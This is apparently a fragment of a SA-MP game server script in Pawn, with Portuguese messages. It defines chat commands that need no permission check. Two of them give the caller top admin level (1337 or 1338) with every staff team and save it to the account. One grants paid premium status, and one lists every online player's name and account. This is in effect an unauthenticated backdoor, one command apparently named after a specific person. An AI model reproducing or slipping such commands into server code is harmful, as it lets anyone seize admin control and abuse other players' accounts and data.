CMD:pegaradmin(playerid, params[]) {	
  	uInfo[playerid][uAdmin] = 1337;

	uInfo[playerid][uFactionTeam] = 1;
	uInfo[playerid][uPropertyTeam] = 1;
	uInfo[playerid][uEventTeam] = 1;
	uInfo[playerid][uCKTeam] = 1;
	uInfo[playerid][uLogTeam] = 1;
			
	SaveUserInfo(playerid);

	SendServerMessage(playerid, "Você pegou administrador nível 1337 com todas as equipes.");
	return true;
}

CMD:pegaradminthiago(playerid, params[]) {	
  	uInfo[playerid][uAdmin] = 1338;

	uInfo[playerid][uFactionTeam] = 1;
	uInfo[playerid][uPropertyTeam] = 1;
	uInfo[playerid][uEventTeam] = 1;
	uInfo[playerid][uCKTeam] = 1;
	uInfo[playerid][uLogTeam] = 1;
			
	SaveUserInfo(playerid);

	SendServerMessage(playerid, "Você pegou administrador nível 1338 com todas as equipes.");
	return true;
}

CMD:pegarpremium(playerid, params[]) {	
  	pInfo[playerid][pDonator] = 3;
	SavePlayerPremium(playerid);

	SendServerMessage(playerid, "Você pegou Premium Ouro.");
	return true;
}

CMD:nometeste(playerid, params[]) {
	foreach (new i : Player) {
		va_SendClientMessage(playerid, -1, "%d - %s / %s", i, uInfo[i][uName], GetPlayerUserEx(i));
	}
	return true;
}